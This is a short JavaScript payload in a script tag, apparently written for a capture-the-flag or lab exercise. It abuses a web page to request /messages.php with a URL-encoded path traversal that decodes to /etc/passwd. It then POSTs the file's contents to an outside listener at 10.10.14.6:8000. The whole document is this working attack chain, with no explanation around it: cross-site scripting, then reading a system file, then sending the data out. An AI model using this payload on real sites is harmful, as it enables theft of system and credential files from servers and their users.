<script>
fetch("/messages.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64")
  .then(response => response.text())
  .then(data => {
    console.log("Fetched data:", data);
    fetch("http://10.10.14.6:8000", {
      method: "POST",
      headers: {
        "Content-Type": "text/plain"
      },
      body: data
    });
    return data;
  });
</script>